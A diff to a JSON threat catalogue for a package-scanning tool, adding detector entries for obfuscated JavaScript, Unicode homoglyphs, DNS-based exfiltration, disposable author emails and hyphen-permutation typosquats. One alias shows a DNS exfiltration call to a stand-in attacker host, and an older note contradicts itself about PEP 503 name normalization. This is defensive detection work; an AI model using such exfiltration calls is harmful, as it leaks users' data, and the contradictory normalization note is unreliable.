@@ -1124,6 +1124,106 @@
       "chokepoint": "deps.typosquat-candidate — PEP 503 normalization treats '-', '_', and '.' as equivalent, so a PyPI-specific edit-distance/normalization pass is needed alongside the existing Damerau-Levenshtein check to catch confusables that normalize identically on PyPI but are visually/typographically distinct package names",
       "soft_warn_no_corpus": true,
       "notes": "P4c — PyPI name normalization (PEP 503) folds '-', '_', and '.' together, so `python-requests` and `python_requests` resolve to DIFFERENT install targets despite looking like the same package — a confusion npm's typosquat detector (which assumes npm's stricter unique-name registry) doesn't need to handle."
+    },
+    {
+      "class": "obfuscation-decode",
+      "kind": "sink",
+      "id": "js-mangler-signature",
+      "aliases": [
+        "javascript-obfuscator _0x[hex]{4,6} identifier fingerprint",
+        "obfuscator.io mangled identifiers"
+      ],
+      "detectors": [
+        "obf.js-mangler-signature"
+      ],
+      "tests": [
+        "packages/detectors/test/obf-js-mangler.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "count of distinct `_0x[a-f0-9]{4,6}` matches across FileCapabilities.dynamicCode/envAccesses snippets + suspiciousLiterals previews",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-KK — port from guarddog:threat-runtime-obfuscation-js-mangling. Fires when ≥3 distinct mangled identifiers appear in a NEW/CHANGED JS-like file in pair.new."
+    },
+    {
+      "class": "obfuscation-decode",
+      "kind": "sink",
+      "id": "unicode-homoglyph-boundary",
+      "aliases": [
+        "Cyrillic-adjacent-ASCII identifier",
+        "Greek omicron in URL",
+        "Cherokee-in-identifier attack (2024 GitHub)",
+        "Mathematical Alphanumeric Symbols in source"
+      ],
+      "detectors": [
+        "obf.unicode-homoglyph-boundary"
+      ],
+      "tests": [
+        "packages/detectors/test/obf-unicode-homoglyph.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "ASCII↔confusable-alphabet-block adjacency in urlLiterals + suspiciousLiterals previews + dynamicCode/envAccesses snippets",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-KK — port from guarddog:threat-runtime-obfuscation-unicode. Diff-safe: fires when the boundary is NEW to a file that had none before, or in an added-package first-version file."
+    },
+    {
+      "class": "net-egress",
+      "kind": "sink",
+      "id": "dns-templated-hostname",
+      "aliases": [
+        "dns.lookup(`${data}.attacker.com`)",
+        "getaddrinfo with template-literal or concatenated hostname",
+        "Burp Collaborator / interact.sh / oastify / dnslog beacons"
+      ],
+      "detectors": [
+        "net.dns-templated-hostname"
+      ],
+      "tests": [
+        "packages/detectors/test/net-dns-templated-hostname.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "capabilities.networkModules ∋ dns/* AND (char-arithmetic-decoder dynamicCode OR encodedUrls OR env-access snippet containing a DNS callee)",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-KK — port from guarddog:threat-network-dns-exfil. Diff-safe: only fires when the DNS module is NEWLY imported in the changed version."
+    },
+    {
+      "class": "publisher-trust",
+      "kind": "entry-point",
+      "id": "disposable-author-domain",
+      "aliases": [
+        "author@mailinator.com",
+        "maintainer@guerrillamail.com",
+        "throwaway-inbox author identity"
+      ],
+      "detectors": [
+        "meta.disposable-author-domain"
+      ],
+      "tests": [
+        "packages/detectors/test/meta-disposable-domain.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "PackageManifest.author.email / maintainers[*].email / _npmUser.email domain suffix match against bundled DISPOSABLE_DOMAINS list (~50 services)",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-KK — port from guarddog:metadata/deceptive_author.py. Diff-safe: only counts disposable-domain emails that are NEW to pair.new (not already in pair.old)."
+    },
+    {
+      "class": "typosquat",
+      "kind": "entry-point",
+      "id": "hyphen-permutation",
+      "aliases": [
+        "cli-<company> vs <company>-cli",
+        "react-native-x vs x-react-native",
+        "same-tokens-different-order name"
+      ],
+      "detectors": [
+        "deps.typosquat-hyphen-permutation"
+      ],
+      "tests": [
+        "packages/detectors/test/typo-hyphen-permutation.test.ts"
+      ],
+      "corpus_refs": [],
+      "chokepoint": "split(pair.new.name, '-').sort() token-set equality against precomputed Top-1000 permutation index",
+      "soft_warn_no_corpus": true,
+      "notes": "Wave 8-KK — port from guarddog:metadata/typosquatting.py hyphen-permutation branch. Complements typo.ts (which uses Damerau-Levenshtein) — hyphen-permutations sit at edit-distance N and slip the existing detector."
     }
   ]
 }
